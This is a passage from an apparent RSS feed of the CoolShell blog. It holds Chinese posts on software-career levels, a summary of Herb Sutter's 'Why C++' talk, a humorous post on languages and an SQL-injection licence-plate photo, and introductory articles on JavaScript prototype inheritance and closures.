</ul>
<ul>
<li>一重门像是开垦荒地，二重门像是扩大生产，三重门像是精耕细作。</li>
</ul>
<ul>
<li>一重门（业务实现）里聚集着大量的劳动密集型的企业，劳动密集型的企业通常都需要流程和方法论。敏捷过程改进这类的东西只在一重门里。</li>
</ul>
<ul>
<li>二重门和三重门里只有少数不多的技术型的公司。这类的公司通常非常注重技术，并且是企业文化是工程师的文化。</li>
</ul>
<ul>
<li>三重门里可以产生的创新和那些可以用来改变世界的技术。</li>
</ul>
<ul>
<li>国内现在的情况是，一重门优化阶段 + 二重门的学习阶段。三重门里似乎还没有什么见术。不过，我看到一些公司已在尝试三重门的东西了。</li>
</ul>
<ul>
<li>作为技术人员的你，如果你想跟上时代，让自己有价值的话，你至少要达到二重门。</li>
</ul>
<ul>
<li>因 为国内的技术环境等不良因素，导致大量的程序员在一重门的时候就已经失去信心，或被大浪淘沙淘掉了，所以，二重门里的程序员比较少了，但是随着年轻的一代 和技术的日趋成熟，也会慢慢多起来的，我现在已经看到这个趋势了。而三重门里的程序员成了稀缺的大熊猫。因为大量的二重门程序员干到那个时候都转管理了。</li>
</ul>
<p><strong>我的这些言论不一定对，但希望能让大家有启发，有所思考。</strong></p>
<p><strong>注</strong>：本来这篇文章的标题想取成“<strong>程序员要解决的三种问题</strong>”， 但是因为过年都在关注 “方韩之争”，所以，干脆取成了这个名字。你可以认为我比较调皮，也可以认为我爱ZB，还可以认为我标题党，反正，请随意理解。（这篇文章是我的自己写 的，没有代笔，因为你一定会在这篇文章中看到属于我的用五笔打出来的错别字，当然，我无法自证，哈哈）</p>
<p>（<span style="color: #cc0000;"><strong>转载时请注明作者和出处，请勿用于商业用途</strong></span>）</p>
 ]]></content>
<pubDate>2012-01-30T11:00:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/6526.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Why C++ ? 王者归来 ]]></title>
<link>https://coolshell.cn/articles/6548.html</link>
<content><![CDATA[ 
<p>因为又有人邀请我去Quora的C2C网站去回答问题去了，这回是 关于 <a href="https://weibo.com/n/laiyonghao">@laiyonghao</a> 的这篇有点争议的博文《2012 不宜进入的三个技术点》ActionScript，Thread 和 C++，<a href="http://blog.csdn.net/lanphaday/article/details/7223385" target="_blank"> C++争议的争议最大</a>。（要我说，.NET比C++更需要慎重进入，呵）。我就在这里回复一下这个问题吧。</p>
<p>正好我一个月前看到一个视频，这个演讲视频还比较著名，这个演讲者是<em>Exceptional C++ </em>和 <em>C++ Coding Standards</em> 的作者，还是ISO C++ 委员会的Chair，C++/CLI首席架构师，还是Microsoft的软件架构师，他叫<a href="http://herbsutter.com/" target="_blank">Herb Sutter</a>，他的这个演讲视频是 <a href="http://cppandbeyond.com/" target="_blank">C++ and Beyond 2011</a>上的一次公开演讲，题目是——<a href="http://channel9.msdn.com/posts/C-and-Beyond-2011-Herb-Sutter-Why-C" target="_blank">Why C++</a>? （如果你觉得那里的视频比较慢，你可以看<a href="http://v.youku.com/v_show/id_XMzA5OTIwODIw.html" target="_blank">优酷上的视频</a>）（英文听力好的同学可以看一样，因为都没有中文字幕）</p>
<p>我觉得这篇文章就足够可以说明很多问题了，所以，我把Herb的演讲幻灯片截了几页放到这里，并做上一些注释，算是一个演讲内容摘要吧。</p>
<p>1） 为什么C++？因为 Performance per $，也就是说performance 就是钱，这个分成三个方面，</p>
<ul>
<li>耗电，芯片的耗电量，移动设备的耗电量，家用电脑的耗电量都和钱有关系。</li>
<li>资源，家用电脑和移动设备上的处理器资源有限，因为要让一般消费者买的起。</li>
<li>体验，在更小的设备上会有更好的体验，有更好的体验就可以挣更多的钱。</li>
</ul>
<p>移动设备上的耗电量相信用过智能手机的人都知道吧，Android手机的耗电量实在是太大了。就算是iPhone在开启Wifi和3G的情况下耗电量也很快。</p>
<p><img alt="image placeholder" ></p>
<p><span id="more-6548"></span></p>
<p>2）C++的进化分成三个时代：</p>
<ul>
<li>1979 – 1989：研究C的对象能力。主要是为C++做准备</li>
<li>1989 – 1999：C++成了主流。</li>
<li>1999 – 2009：Coffee-based语言（Java, .NET）出现了，极大的提高了开发生产力。</li>
</ul>
<p style="padding-left: 30px;">对于第三个时代，Herb说了很多，他说这个并没有什么错，因为这个时候我们非常关注开发的生产力，这个非常重要，这就是为什么C++一下就失去优势的地方。但是是否这些Coffee-Based的语言可以做任重要的事呢？不行，很多时候，这是一个Trade-Off的事，也就是生产力不是免费的是需要你用别的东西去交换的。</p>
<p><img alt="image placeholder" ></p>
<p>3）第四个时期。</p>
<p style="padding-left: 30px;">Herb认为，2009-2019是第四个时期，因为我们又喜欢Native Code了，C++从被驱逐后又被请回来了。因为网站的性能越来越是个问题，移动端的设备非常流行。但主要是因为Performance就是钱，因为前面的三个因素，性能影响的是dollar，不尊重性能的公司都会发现花钱的速度太快了。（比如去年大家热炒的京东促销和12306.cn的问题，12306给整个社会造成了巨大的金钱浪费）</p>
<p style="padding-left: 30px;">Herb把这个时期比做 The Return of the King。（指环王的第三部：王者归来）<strong> 性能为王！</strong></p>
<p style="padding-left: 30px;">这就好像我在“<a title="软件开发的“三重门”" href="https://coolshell.cn/articles/6526.html" target="_blank">软件开发的三重门</a>”里说的，开垦时代需要的是快和生产力，而开垦完后就得保证其稳定性。</p>
<p><img alt="image placeholder" ></p>
<p>4）Herb还给了一张幻灯片问，“The World is built on ….”，后面例出了多个语言。然后Herb说，世界是由C和C++构成的。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>5）Herb给了一张表格，这张表可相当形像。如果把我们的对编程语言的需求总结为四个：<strong>效率，灵活，抽象，生产率</strong>。那么，C语言玩的是前两个，而C++玩的是前三个，Java和C#玩的是后两个（抽象和生产率）</p>
<p>任保一种设计都不可能让你什么都要的，这就是Trade-Off——什么事都需要交换的。</p>
<p><img alt="image placeholder" ></p>
<p>6）Herb举了一个微软内的例子，用C++ 和 ATL 来开发IE工具条的报告，意思是你可以用脚本在IE的工具条上加按钮，但是作者建议使用C++，因为用.NET或是脚本有重大的limitation，尤其是性能上的问题。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">7）接下来，我们来看看移动设备。</p>
<p style="text-align: left; padding-left: 30px;">下图中，第一个是iOS，第二个是Android，第三个是WinPhone。Herd说了几个事：</p>
<p style="text-align: left; padding-left: 30px;">a）比Web APP，人们更喜欢Native的APP，这个在用移动设备上可以得到验证。</p>
<p style="text-align: left; padding-left: 30px;">b）iOS也好，Android也好，WinPhone也好，他们不是在搞操作系统，而是在搞应用，为的是让智能手机更好。手机就是一个App。</p>
<p style="text-align: left; padding-left: 30px;">c）这三个手机在第一版出来时都不支持C++，而第二版出来时都支持C++了。因为他们要兼顾性能和一定程度上的开发效率。WinPhone还没有到第二版，让我们拭目以待。（我以前写过一篇<a title="Android将允许纯C/C++开发应用" href="https://coolshell.cn/articles/3549.html" target="_blank">调侃Android支持C++开发</a>的文章，这也只是一年前的事，说明C++全面回归了）</p>
<p><img alt="image placeholder" ></p>
<p>8）如果你还是不相信的话，我们可以看看为什么Apple和Google都在搞C++的编译器，因为他们觉得g++性能不行。所以，基于LLVM的编译器正在领导潮流，因为我们关注Natvie Code的性能优化。</p>
<p><img alt="image placeholder" ></p>
<p>9）接下来，Herb说了一下数据中心，你知道数据中心最花钱的是什么吗？三个事：</p>
<blockquote>
<ul>
<li>57% 花在了硬件上。</li>
<li>18% 花在了配电和降温上。</li>
<li>13% 花在了耗电上。</li>
</ul>
</blockquote>
<p style="padding-left: 30px;">88%的钱花在了硬件和电力上。这可是很大一笔费用啊。（还有人说硬件比软件便宜吗？）我记得我上一个公司的数据中心每年要花的电费就在百万美元以上。</p>
<p><img alt="image placeholder" ></p>
<p>10）昨天在<a href="https://weibo.com/1401880315/y3kshD9jf" target="_blank">微博上有个笑话</a>，说是某咨询师要求程序员把代码打印出来走查，程序员问是不是要用彩打？哈哈。我说，这至少不环保嘛。消耗太大了。是的，C++是可以省电的，以及于C++之父都在YouTube 说C++是可以减轻全球变暖的问题。哇，C++开始真正造福人类了。</p>
<p><img alt="image placeholder" ></p>
<p>11）我还需要重温一下老大的这句话——</p>
<blockquote>
<p><strong>My contribution to the fight against global warming is C++’s efficiency</strong>: Just think if Google had to have twice as many server farms! Each uses as much energy as a small town. And it’s not just a factor of two…<strong> Efficiency is not just running fast or running bigger programs, it’s also running using less resources</strong>.</p>
<p style="text-align: right;">Bjarne Stroustrup, June 2011</p>
</blockquote>
<p style="text-align: left; padding-left: 30px;">最后一句说的非常好！<strong>效率不仅仅只是跑得，跑得多，更是可以使用更少的资源</strong>。</p>
<p style="text-align: left;">12）下面让我们再来看一张表，一张把钱投到哪里的表格，这样我们可以看到一些趋势。</p>
<ul>
<li>70年代80年代，资源不够，主要是把钱投在性能上。</li>
<li>80年代到90代，主要是90年代开始有一半的投次到了抽象和生产率上。</li>
<li>00年代，完全都在抽象和生产率上。</li>
<li>10年代，80%的钱都要回头来解决性能问题。这就是C/C++的王者归来。</li>
</ul>
<p><img alt="image placeholder" ></p>
<p>13）当然，不是C++不注重 开发效率，看看C++0X的标准引入了多少东西我们就知道了。但是本质上，<strong>C++还是致力于性能和抽象的完全平衡</strong>。</p>
<p><img alt="image placeholder" ></p>
<p>那么，我们还会觉得C++要被淘汰了，不适合进入了吗？看完这个演讲，你应该有答案的。</p>
<p>后面讲了C++的文艺复兴，你可以在Google 搜索 “<a href="https://www.google.com/search?q=C%2B%2B+Renaissance" target="_blank">C++ Renaissance</a>”看看。另外，<strong>该视频的讲议可以在<a href="http://ecn.channel9.msdn.com/content/WhyCPPCB2011.pdf" target="_blank">这里下载</a></strong>。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-02-02T08:22:57+08:00</pubDate>
<guid>https://coolshell.cn/articles/6548.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 千万别惹程序员 ]]></title>
<link>https://coolshell.cn/articles/6639.html</link>
<content><![CDATA[ 
<p>酷壳好久没有发娱乐性质的技术文章了，搞得气氛有点严肃了，考虑到程序员们都是比较严肃和容易较真的类书呆子的群体，所以，需要更新一个有娱乐性质的文章了。正好最近看到了两个比较有趣的图，在新浪微博上都得到了比较不错的反响，因此，更新到酷壳上来。</p>
<h4>如果编程语言是一种刀</h4>
<p>下面这个图是把编程语言看做是一种刀，那么会是什么样的。这个图我个人感觉很有意思。</p>
<p><img alt="image placeholder" ></p>
<p>对于这个图，最好不要解释，意会就好。不过，我却有点想不解风情，忍不住想解释一下。</p>
<p><span id="more-6639"></span></p>
<ul>
<li>C++，C，Pascal 都是瑞士军刀，说明是用来做细活的工具。C语言的刀上有个USB，说明是可以做硬件操作的。C++的刀是什么都有，说明C++是一种功能繁多的语言。（图中C++的那把瑞士军刀很强大，不要以为其是虚构的，这把刀是真实存在的，叫Wenger巨人刀，<a href="http://www.wenger.ch/giant-knife-wenger-swiss-army-knife" target="_blank">http://www.wenger.ch/giant-knife-wenger-swiss-army-knife</a> (这个网页上有个Youtube视频，可以爬墙去看)，<a href="https://s.taobao.com/search?q=giant-knife-wenger-swiss-army-knife&amp;keyword=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;tracelog=&amp;sourceId=tb.index&amp;initiative_id=tbindexz_20120220" target="_blank">淘宝上有卖的</a>，价格在1万4左右。）</li>
<li>Java/C#是一把塑料餐刀，这说明，Java和C#语言是带虚拟机的，而且其语法和使用并不像C++那么复杂，其泛型编程可以有很多种玩法，而Java和C#的泛型编程是比较单一的。</li>
<li>Python是把电锯，人挡杀人，佛招杀佛，威力很大，面对大型的物体的修整，比C++/C/Java什么的得心应手得多得多，但是对于一些精细的调优工作，明显不行。这和Ruby很像。</li>
<li>PHP没有MySQL，明显是被幽默了一把。不过最近对PHP的批评越来越多，不过，facebook的PHP的引擎HiPo已经很牛B了。</li>
<li>Perl是一本日本武士刀，是忍者玩的语言。</li>
<li>VB，就是一个玩具。你见过用塑料玩具勺当刀的吗？Haskell感觉是外星来的。呵呵</li>
</ul>
<h4>千万别惹程序员</h4>
<p>下图一张昨天我公司内部被传递的图片。经典的SQL注入式攻击。千万别惹程序员</p>
<p><img alt="image placeholder" ></p>
<p>这是一个有技术含量的号牌遮挡。我们先不说其是不是能奏效，不过，这个创意相当的NB啊。当你驾车通过某些路口时，被摄像头捕捉到你的车牌，通过OCR变成文本，然后插入数据库，于是，上图的这个车牌就成了SQL注入。（不要以为车牌的OCR技术还不行，这项目技术已经非常成熟了，无论是国内还是国外）。这张图片就如同“<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中应该知道的事</a>”中说的一样——永远不要相信用户的输入。</p>
<p><strong>插曲</strong>：我昨天把这张图片<a href="https://weibo.com/1401880315/y6kIAj1oN" target="_blank">放到微博</a>，结果，<strong>被转了几万次，上了热门转发的top list和一些社会热点和明星八卦排在了一起</strong>。主要是被“<em>@微博搞笑排行榜:  @全球潮流趣闻:  @实用小百科: @经典英文语录:  @当时我就泪奔了: @老榕: @全球经典音乐: @环球汽车搜罗: @怪诞心理行为学: @精彩电影: @互联网的那点事: @潮混搭:  @热门微博: @SinaAppEngine:</em> ” 还有些什么体育记者，法律记者都转了， 这些转发了。这多少让我觉得有些诧异，这是很技术的一件事啊，怎么连什么电影，英文对白，汽车，音乐什么的都转了？我是相当的费解啊，我只能有两个认为——</p>
<ol>
<li>简单的认为关心技术的人还是很多的。</li>
<li>复杂地认为国人是喜欢起哄的，不问为什么。</li>
</ol>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-02-21T07:54:57+08:00</pubDate>
<guid>https://coolshell.cn/articles/6639.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 再谈javascript面向对象编程 ]]></title>
<link>https://coolshell.cn/articles/6668.html</link>
<content><![CDATA[ 
<p><strong>前言:</strong>虽有陈皓<a href="https://coolshell.cn/articles/6441.html">《Javascript 面向对象编程》</a>珠玉在前，但是我还是忍不住再画蛇添足的补上一篇文章，主要是因为javascript这门语言魅力。另外这篇文章是一篇入门文章，我也是才开始学习Javascript，有一点心得，才想写一篇这样文章，文章中难免有错误的地方，还请各位不吝吐槽指正</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%90%90%E6%A7%BDJavascript" title="吐槽Javascript">吐槽Javascript</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#_proto_%E6%88%90%E5%91%98" title="__proto__成员">__proto__成员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%87%BD%E6%95%B0%E5%AF%B9%E8%B1%A1prototype%E6%88%90%E5%91%98" title="函数对象prototype成员">函数对象prototype成员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#new_%E6%93%8D%E4%BD%9C%E7%AC%A6" title="new 操作符">new 操作符</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Pseudoclassical_%E7%BB%A7%E6%89%BF" title="Pseudoclassical 继承">Pseudoclassical 继承</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Prototypal%E7%BB%A7%E6%89%BF" title="Prototypal继承">Prototypal继承</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%8F%82%E8%80%83" title="参考:">参考:</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%9A" title="题外话：">题外话：</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%90%90%E6%A7%BDJavascript"></span><strong><span style="color: #008000">吐槽Javascript</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>初次接触Javascript，这门语言的确会让很多正规军感到诸多的不适，这种不适来自于Javascript的语法的简练和不严谨，这种不适也来自Javascript这个悲催的名称，我在想网景公司的Javascript设计者在给他起名称那天一定是脑壳进水了,让Javascript这么多年来受了这么多不白之冤，人们都认为他是Java的附属物，一个WEB玩具语言。因此才会有些人会对Javascript不屑，认为Javascript不是一门真正的语言，但是这此他们真的错了。Javascript不仅是一门语言，是一门真真正正的语言，而且他还是一门里程碑式的语言，他独创多种新的编程模式原型继承，闭包（<strong>作者注：闭包不是JS首创，应该Scheme首创，prototypal inheritance 和 dynamic objects 是self语言首创，Javascript的首创并不精彩,谢谢网友的指正。</strong>），对后来的动态语言产生了巨大的影响。做为当今最流行的语言（没有之一），看看git上提交的最多的语言类型就能明白。随着HTML5的登场，浏览器将在个人电脑上将大显身手，完全有替换OS的趋势的时候，Javascript做为浏览器上的一门唯一真真的语言，如同C之于 unix/linux，java之于JVM，Cobol之于MainFrame，我们也需要来重新的认真地认识和审视这门语言。另外Javascript的正式名称是：ECMAScript，这个名字明显比Javascript帅太多了！<br>
<span id="more-6668"></span><br>
言归正传，我们切入主题——Javascript的面向对象编程。要谈Javascript的面向对象编程，我们第一步要做的事情就是忘记我们所学的面向对象编程。传统C++或Java的面向对象思维来学习Javascript的面向对象会给你带来不少困惑，让我们先忘记我们所学的，从新开始学习这门特殊的面向对象编程。既然是OO编程，要如何来理解OO编程呢，记得以前学C++，学了很久都不入门，后来有幸读了《Inside The C++ Object Model》这本大作，顿时豁然开朗，因此本文也将以对象模型的方式来探讨的Javascript的OO编程。因为Javascript 对象模型的特殊性，所以使得Javascript的继承和传统的继承非常不一样，同时也因为Javascript里面没有类，这意味着Javascript里面没有extends,implements。那么Javascript到底是如何来实现OO编程的呢？好吧，让我们开始吧，一起在Javascript的OO世界里来一次漫游</p>
<p>首先，我们需要先看看Javascript如何定义一个对象。下面是我们的一个对象定义：</p>
<p>[javascript]<br>
var o = {};<br>
[/javascript]</p>
<p>还可以这样定义一个对象</p>
<p>[javascript]<br>
function f() {<br>
}<br>
[/javascript]</p>
<p>对，你们没有看错，在Javascript里面，函数也是对象。<br>
当然还可以</p>
<p>[javascript]<br>
var array1= [ 1,2,3];<br>
[/javascript]</p>
<p>数组也是一个对象。<br>
其他关于对象的基本的概念的描述，还是请各位亲们参见陈皓<a href="https://coolshell.cn/articles/6441.html">《Javascript 面向对象编程》</a>文章。<br>
对象都有了，唯一没有的就是class，因为在Javascript里面是没有class关键字的，算好还有function，function的存在让我们可以变通的定义类，在扩展这个主题前，我们还需要了解一个Javascript对象最重要的属性，<strong>__proto__</strong>成员。</p>
<h4>
<span class="ez-toc-section" id="_proto_%E6%88%90%E5%91%98"></span><strong><span style="color: #008000">__proto__成员</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>严格的说这个成员不应该叫这个名字，__proto__是Firefox中的称呼，__proto__只有在Firefox浏览器中才能被访问到。<strong>做为一个对象，当你访问其中的一个成员或方法的时候，如果这个对象中没有这个方法或成员，那么Javascript引擎将会访问这个对象的__proto__成员所指向的另外的一个对象，并在那个对象中查找指定的方法或成员，如果不能找到，那就会继续通过那个对象的__proto__成员指向的对象进行递归查找，直到这个链表结束</strong>。<br>
好了，让我们举一个例子。<br>
比如上上面定义的数组对象array1。当我们创建出array1这个对象的时候，array1实际在Javascript引擎中的对象模型如下：<br>
<img alt="image placeholder" ><br>
array1对象具有一个length属性值为3，但是我们可以通过如下的方法来为array1增加元素：</p>
<p>[javascript]<br>
array1.push(4);<br>
[/javascript]</p>
<p>push这个方法来自于array1的__proto__成员指向对象的一个方法(Array.prototye.push())。正是因为所有的数组对象（通过[]来创建的）都包含有一个指向同一个具有push,reverse等方法对象(Array.prototype)的__proto__成员，才使得这些数组对象可以使用push,reverse等方法。</p>
<p>那么这个__proto__这个属性就相当于面向对象中的”has a”关系，这样的的话，只要我们有一个模板对象比如Array.prototype这个对象，然后把其他的对象__proto__属性指向这个对象的话就完成了一种继承的模式。不错！我们完全可以这么干。但是别高兴的太早，这个属性只在FireFox中有效，其他的浏览器虽然也有属性，但是不能通过__proto__来访问，只能通过getPrototypeOf方法进行访问，而且这个属性是只读的。看来我们要在Javascript实现继承并不是很容易的事情啊。</p>
<h4>
<span class="ez-toc-section" id="%E5%87%BD%E6%95%B0%E5%AF%B9%E8%B1%A1prototype%E6%88%90%E5%91%98"></span><strong><span style="color: #008000">函数对象prototype成员</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>首先我们先来看一段函数prototype成员的定义，</p>
<blockquote><p><strong>When a function object is created, it is given a prototype member which is an object containing a constructor member which is a reference to the function object</strong><br>
当一个函数对象被创建时，这个函数对象就具有一个prototype成员，这个成员是一个对象，这个对象包含了一个构造子成员，这个构造子成员会指向这个函数对象。</p></blockquote>
<p>例如：</p>
<p>[javascript]<br>
function Base() {<br>
this.id = "base"<br>
}<br>
[/javascript]</p>
<p>Base这个函数对象就具有一个prototype成员，关于构造子其实Base函数对象自身，为什么我们将这类函数称为构造子呢？原因是因为这类函数设计来和new 操作符一起使用的。为了和一般的函数对象有所区别，这类函数的首字母一般都大写。构造子的主要作用就是来创建一类相似的对象。</p>
<p>上面这段代码在Javascript引擎的对象模型是这样的<br>
<img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="new_%E6%93%8D%E4%BD%9C%E7%AC%A6"></span><strong><span style="color: #008000">new 操作符</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>在有上面的基础概念的介绍之后，在加上new操作符，我们就能完成传统面向对象的class + new的方式创建对象，在Javascript中，我们将这类方式成为Pseudoclassical。<br>
基于上面的例子，我们执行如下代码</p>
<p>[javascript]<br>
var obj = new Base();<br>
[/javascript]</p>
<p>这样代码的结果是什么，我们在Javascript引擎中看到的对象模型是：<br>
<img alt="image placeholder" ></p>
<p>new操作符具体干了什么呢?其实很简单，就干了三件事情。</p>
<p>[javascript]<br>
var obj = {};<br>
obj.__proto__ = Base.prototype;<br>
Base.call(obj);<br>
[/javascript]</p>
<p>第一行，我们创建了一个空对象obj<br>
第二行，我们将这个空对象的__proto__成员指向了Base函数对象prototype成员对象<br>
第三行，我们将Base函数对象的this指针替换成obj，然后再调用Base函数，于是我们就给obj对象赋值了一个id成员变量，这个成员变量的值是”base”，关于call函数的用法，请参看陈皓<a href="https://coolshell.cn/articles/6441.html">《Javascript 面向对象编程》</a>文章<br>
如果我们给Base.prototype的对象添加一些函数会有什么效果呢？<br>
例如代码如下：</p>
<p>[javascript]<br>
Base.prototype.toString = function() {<br>
return this.id;<br>
}<br>
[/javascript]</p>
<p>那么当我们使用new创建一个新对象的时候，根据__proto__的特性，toString这个方法也可以做新对象的方法被访问到。于是我们看到了：<br>
<strong>构造子中，我们来设置‘类’的成员变量（例如：例子中的id），构造子对象prototype中我们来设置‘类’的公共方法。于是通过函数对象和Javascript特有的__proto__与prototype成员及new操作符，模拟出类和类实例化的效果。</strong></p>
<h4>
<span class="ez-toc-section" id="Pseudoclassical_%E7%BB%A7%E6%89%BF"></span><strong><span style="color: #008000">Pseudoclassical 继承</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>我们模拟类，那么继承又该怎么做呢？其实很简单，我们只要将构造子的prototype指向父类即可。例如我们设计一个Derive 类。如下</p>
<p>[javascript]<br>
function Derive(id) {<br>
this.id = id;<br>
}<br>
Derive.prototype = new Base();<br>
Derive.prototype.test = function(id){<br>
return this.id === id;<br>
}<br>
var newObj = new Derive("derive");<br>
[/javascript]</p>
<p>这段代码执行后的对象模型又是怎么样的呢？根据之前的推导，应该是如下的对象模型<br>
<img alt="image placeholder" ><br>
这样我们的newObj也继承了基类Base的toString方法，并且具有自身的成员id。关于这个对象模型是如何被推导出来的就留给各位同学了，参照前面的描述，推导这个对象模型应该不难。<br>
Pseudoclassical继承会让学过C++/Java的同学略微的感受到一点舒服，特别是new关键字，看到都特亲切，不过两者虽然相似，但是机理完全不同。当然不关什么样继承都是不能离不开__proto__成员的。</p>
<h4>
<span class="ez-toc-section" id="Prototypal%E7%BB%A7%E6%89%BF"></span><strong><span style="color: #008000">Prototypal继承</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>这是Javascript的另外一种继承方式，这个继承也就是之前陈皓文章《Javascript 面向对象编程》中create函数，非常可惜的是这个是ECMAScript V5的标准，支持V5的浏览器目前看来也就是IE9，Chrome最新版本和Firefox。虽然看着多，但是做为IE6的重灾区的中国，我建议各位还是避免使用create函数。好在没有create函数之前，Javascript的使用者已经设计出了等同于这个函数的。例如：我们看看Douglas Crockford的object函数。</p>
<p>[javascript]<br>
function object(old) {<br>
function F() {};<br>
F.prototype = old;<br>
return new F();<br>
}<br>
var newObj = object(oldObject);<br>
[/javascript]</p>
<p>例如如下代码段</p>
<p>[javascript]<br>
var base ={<br>
id:"base",<br>
toString:function(){<br>
return this.id;<br>
}<br>
};<br>
var derive = object(base);<br>
[/javascript]</p>
<p>上面函数的执行后的对象模型是：<br>
<img alt="image placeholder" ><br>
如何形成这样的对象模型，原理也很简单，只要把object这个函数扩展一下，就能画出这个模型，怎么画留给读者自己去画吧。<br>
这样的继承方式被称为原型继承。相对来说要比Pseudoclassical继承来的简单方便。ECMAScript V5正是因为这原因也才增加create函数，让开发者可以快速的实现原型继承。<br>
上述两种继承方式是Javascript中最常用的继承方式。通过本文的讲解，你应该对Javascript的OO编程有了一些‘原理’级的了解了吧</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span><strong><span style="color: #008000">参考:</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://msdn.microsoft.com/en-us/scriptjunkie/ff852808">《Prototypes and Inheritance in JavaScript Prototypes and Inheritance in JavaScript》</a><br>
<a href="http://yuiblog.com/blog/2006/11/27/video-crockford-advjs/" target="_blank">Advance Javascript</a> （Douglas Crockford 大神的视频，一定要看啊）</p>
<h4>
<span class="ez-toc-section" id="%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%9A"></span><strong><span style="color: #008000">题外话：</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>web2.0后，web应用可谓飞速发展，如今在HTML5发布之际，浏览器的功能被大大强化，我感觉Browser远远在不是一个Browser那么简单了。记得C++之父曾经这样说过JAVA，JAVA不是跨平台，JAVA本身就是一个平台。如今的Browser也本身就是一个平台了，好在这个平台是基于标准的。如果Browser是平台，由于Browser安全沙箱的限制，个人电脑的资源被使用的很少，感觉Browser就是一个NC（Network Computer）？我们居然又回到了Sun最初提出的构想，Sun是不是太强大了些？</p>
 ]]></content>
<pubDate>2012-02-27T08:25:13+08:00</pubDate>
<guid>https://coolshell.cn/articles/6668.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 理解Javascript的闭包 ]]></title>
<link>https://coolshell.cn/articles/6731.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000">感谢 Neo 投递本文 – 微博帐号：<a title="_锟_" href="https://weibo.com/gandalfthegrey" target="_blank">_锟_</a> </span>】</p>
<p><strong>前言：还是一篇入门文章。</strong>Javascript中有几个非常重要的语言特性——对象、原型继承、闭包。其中闭包对于那些使用传统静态语言C/C++的程序员来说是一个新的语言特性。本文将以例子入手来介绍Javascript闭包的语言特性，并结合一点ECMAScript语言规范来使读者可以更深入的理解闭包。</p>
<p>注：<strong>本文是入门文章，例子素材整理于网络<strong>，如果你是高手，欢迎针对文章提出技术性建议和意见。本文讨论的是Javascript，不想做语言对比，如果您对Javascript天生不适，请自行绕道。</strong></strong></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%97%AD%E5%8C%85" title="什么是闭包">什么是闭包</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#ECMAScript%E9%97%AD%E5%8C%85%E6%A8%A1%E5%9E%8B" title="ECMAScript闭包模型">ECMAScript闭包模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E9%97%AD%E5%8C%85%E7%9A%84%E6%A0%B7%E5%88%97" title="闭包的样列">闭包的样列</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%97%AD%E5%8C%85%E7%9A%84%E5%BA%94%E7%94%A8" title="闭包的应用">闭包的应用</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BB%80%E4%B9%88%E6%98%AF%E9%97%AD%E5%8C%85"></span><strong><span style="color: #008000">什么是闭包</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p>闭包是什么?闭包是Closure，这是静态语言所不具有的一个新特性。但是闭包也不是什么复杂到不可理解的东西，简而言之，闭包就是：<strong></strong></p>
<ul>
<li><strong>闭包就是函数的局部变量集合，只是这些局部变量在函数返回后会继续存在。</strong></li>
